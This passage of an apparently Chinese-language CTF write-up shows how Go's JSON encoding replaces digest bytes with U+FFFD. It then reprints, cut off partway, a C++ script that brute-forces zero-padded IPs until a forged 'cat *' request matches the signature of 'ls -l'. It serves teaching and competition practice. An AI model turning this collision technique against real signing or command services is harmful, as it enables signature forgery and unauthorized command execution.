class="line">[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="string">"\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd"</span></span><br><span class="line"><span class="string">'\\u000e\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd'</span></span><br><span class="line">&gt;&gt;&gt; from hashlib import *</span><br><span class="line">&gt;&gt;&gt; sha1(<span class="string">'172.17.0.1|ls -l'</span>).digest()</span><br><span class="line"><span class="string">'\x0e\t\x1d\xbd\x12\x90.\xca\xf0\xd9?-\x98KC\xeb\x05\xa1@\xd1'</span></span><br></pre></td></tr></table></figure><p>由于 go 的 json 编码，很多不可见字符都被转为了 <code>U+fffd</code>，丢失了很多信息。</p><p>再经过 php 接口的接收，我们来看一下结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$d = json_decode(file_get_contents(<span class="string">'php://input'</span>), JSON_THROW_ON_ERROR);</span><br><span class="line">var_dump(file_get_contents(<span class="string">'php://input'</span>));</span><br><span class="line">var_dump($d);</span><br><span class="line">var_dump(bin2hex($d));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string(89) &quot;&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span><br><span class="line">&quot;</span><br><span class="line">string(38) &quot;��.���?-�KC��@�&quot;</span><br><span class="line">string(76) &quot;0e091defbfbd12efbfbd2eefbfbdefbfbdefbfbd3f2defbfbd4b43efbfbd05efbfbd40efbfbd&quot;</span><br><span class="line">&quot;K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\/u1\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\/\/h6I=&quot;</span><br><span class="line">oops, hsm is jsonless?</span><br></pre></td></tr></table></figure><p><code>U+fffd</code>变成了<code>\xef\xbf\xbd</code>。所以由于 go 的 json 编码问题，丢失了很多信息，造成了 md5 前的数据有很多相同字符。当时做题时往下并没有细想，得到 n 后总是想构造出任意命令的签名，也很疑惑如果构造出岂不是这种签名就不安全了？其实是无法得到的。</p><p>正解是 go 的这种问题 ，为碰撞创造了条件。我们可以碰撞出在这种编码情况下与 <code>ls -l</code>有相同结果的<code>cat *</code> 此类命令。但是问题是我们需要非常大量 ip 来提供碰撞的数据。</p><p>可以发现，go 取 ip 的时候，是先用<code>net.ParseIP</code>解析了 ip，我们在 ip 每个数字前面加 0 ，解析后还是原来的 ip 结果，每个数字最多添加 256 个 0，四个数字就已经产生了 <code>2^32</code>种不同的组合，足以碰撞出 <code>ls -l</code>与 <code>cat *</code>之间的冲突。</p><p>官方题解的 c++ 碰撞脚本：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> num_threads = <span class="built_in">std</span>::thread::hardware_concurrency();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">hash</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="keyword">const</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SHA_CTX ctx;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Init(&amp;ctx)) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Update(&amp;ctx, s.data(), s.length())) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">d</span><span class="params">(SHA_DIGEST_LENGTH, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Final((<span class="keyword">uint8_t</span> *) &amp;d[<span class="number">0</span>], &amp;ctx)) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="built_in">std</span>::<span class="function">u32string <span class="title">kapot</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="keyword">const</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="function">u32string <span class="title">r</span><span class="params">(s.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">size_t</span> o = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.length(); ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> T = [](<span class="keyword">uint8_t</span> c) &#123;</span><br><span class="line">            <span class="keyword">return</span> (c &lt; <span class="number">0x80</span>)         ? <span class="number">1</span>   <span class="comment">/* ASCII */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xc0</span>) == <span class="number">0x80</span> ? <span class="number">0</span>   <span class="comment">/* continuation */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xe0</span>) == <span class="number">0xc0</span> ? <span class="number">2</span>   <span class="comment">/* 2-byte chunk */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xf0</span>) == <span class="number">0xe0</span> ? <span class="number">3</span>   <span class="comment">/* 3-byte chunk */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xf8</span>) == <span class="number">0xf0</span> ? <span class="number">4</span>   <span class="comment">/* 4-byte chunk */</span></span><br><span class="line">                 : <span class="number">-1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> c = s[i++];</span><br><span class="line">        <span class="keyword">auto</span> cont = [&amp;]() &#123; c = (c &lt;&lt; <span class="number">6</span>) | (s[i++] &amp; <span class="number">0x3f</span>); &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (T(c)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">case</span>  <span class="number">0</span>:</span><br><span class="line">        invalid: c = <span class="number">0xfffd</span>; <span class="comment">/* fall through */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">1</span>:</span><br><span class="line">        valid:   r[o++] = c; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">2</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">0</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 <span class="keyword">goto</span> one;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">3</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">1</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]) || T(s[i+<span class="number">1</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 <span class="keyword">goto</span> two;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">4</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">2</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]) || T(s[i+<span class="number">1</span>]) || T(s[i+<span class="number">2</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 cont();</span><br><span class="line">        two:     cont();</span><br><span class="line">        one:     cont();</span><br><span class="line">                 <span class="keyword">goto</span> valid;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r.resize(o);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::atomic&lt;<span class="keyword">uint64_t</span>&gt; hcount = <span class="number">0</span>, kcount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::u32string, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="keyword">tab_t</span>;</span><br><span class="line"><span class="keyword">tab_t</span> tab0, tab1;</span><br><span class="line"><span class="built_in">std</span>::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">uint8_t</span>,4&gt; ip;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> cmd0, cmd1;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">stuffer_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">size_t</span>,4&gt; cnts;</span><br><span class="line">        <span class="keyword">size_t</span> step;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> cmd;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">stuffer_t</span>(<span class="keyword">size_t</span> t, <span class="keyword">size_t</span> s, <span class="built_in">std</span>::<span class="built_in">string</span> c) : cnts&#123;t&#125;, step(s), cmd(c) &#123;&#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//XXX this is by far not the most efficient way of doing this, but yeah</span></span><br><span class="line">            <span class="keyword">if</span> (++cnts[<span class="number">3</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                cnts[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (++cnts[<span class="number">2</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                    cnts[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> (++cnts[<span class="number">1</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                        cnts[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                        cnts[<span class="number">0</span>] += step;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">stringstream</span> o;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">                o &lt;&lt; (i ? <span class="string">"."</span> : <span class="string">""</span>)</span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(cnts[i], <span class="string">'0'</span>)</span><br><span class="line">                  &lt;&lt; (<span class="keyword">unsigned</span>) ip[i];</span><br><span class="line">            o &lt;&lt; <span class="string">"|"</span> &lt;&lt; cmd;</span><br><span class="line">            <span class="keyword">return</span> o.str();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">(<span class="keyword">size_t</span> tid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//XXX tid stuff is a hack, but YOLO</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> one = tid &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">stuffer_t</span> next(tid &gt;&gt; <span class="number">1</span>, (num_threads + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>, one ? cmd1 : cmd0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">tab_t</span>&amp; mytab = one ? tab1 : tab0;</span><br><span class="line">    <span class="keyword">tab_t</span>&amp; thtab = one ? tab0 : tab1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> myhcount = <span class="number">0</span>, mykcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> r = next();</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            ++myhcount;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> h = hash(r);</span><br><span class="line">            <span class="keyword">if</span> ((h.size()+<span class="number">3</span>)/<span class="number">4</span> &lt; (<span class="keyword">size_t</span>) <span class="built_in">std</span>::count_if(h.begin(), h.end(),</span><br><span class="line">                                            [](<span class="keyword">unsigned</span> <span class="keyword">char</span> c) &#123; <span class="keyword">return</span> c &lt; <span class="number">0x80</span>; &#125;))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            ++mykcount;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> k = kapot(h);</span><br><span class="line">            <span class="keyword">if</span> (k.size() &gt; <span class="number">3</span> + (<span class="keyword">size_t</span>) <span class="built_in">std</span>::count(k.begin(), k.end(), <span class="number">0xfffd</span>))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; lck(mtx);</span><br><span class="line"></span><br><span class="line">            hcount += myhcount, myhcount = <span class="number">0</span>;</span><br><span class="line">            kcount += mykcount, mykcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (thtab.find(k) != thtab.end()) &#123;</span><br><span class="line"></span><br><span class="line">                mytab[k] = r;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"\r\x1b[K"</span></span><br><span class="line">                          &lt;&lt; <span class="string">"\x1b[32m"</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; tab0[k] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                          &lt;&lt; tab1[k] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"\x1b[0m"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::hex;</span><br><span class="line">                <span class="keyword">bool</span> first = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">uint32_t</span> c: k)</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; (first ? first = <span class="literal">false</span>, <span class="string">""</span> : <span class="string">" "</span>) &lt;&lt; c;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::dec &lt;&lt; <span class="string">"hash count:  \x1b[35m"</span> &lt;&lt; hcount &lt;&lt; <span class="string">"\x1b[0m"</span>;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                    s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(hcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" (2^\x1b[35m"</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">"\x1b[0m"</span> &lt;&lt; <span class="string">")"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"kapot count: "</span> &lt;&lt; <span class="string">"\x1b[35m"</span> &lt;&lt; kcount &lt;&lt; <span class="string">"\x1b[0m"</span>;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                    s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(kcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" (2^\x1b[35m"</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">"\x1b[0m)"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"table sizes: \x1b[35m"</span></span><br><span class="line">                          &lt;&lt; tab0.size() &lt;&lt; <span class="string">"\x1b[0m \x1b[35m"</span></span><br><span class="line">                          &lt;&lt; tab1.size() &lt;&lt; <span class="string">"\x1b[0m"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mytab.size() &lt; (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line">                mytab[k] = r;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hcount += myhcount;</span><br><span class="line">        kcount += mykcount;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; lck(mtx);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"\r\x1b[K"</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"hash count: \x1b[35m"</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">12</span>) &lt;&lt; hcount &lt;&lt; <span class="string">"\x1b[0m "</span>;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(hcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"(2^\x1b[35m"</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">"\x1b[0m) | "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"kapot count: \x1b[35m"</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">12</span>) &lt;&lt; kcount &lt;&lt; <span class="string">"\x1b[0m "</span>;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(kcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"(2^\x1b[35m"</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">"\x1b[0m) | "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"tables: \x1b[35m"</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">9</span>) &lt;&lt; tab0.size() &lt;&lt; <span class="string">" "</span></span><br><span class="line">                      &lt;&lt; <span 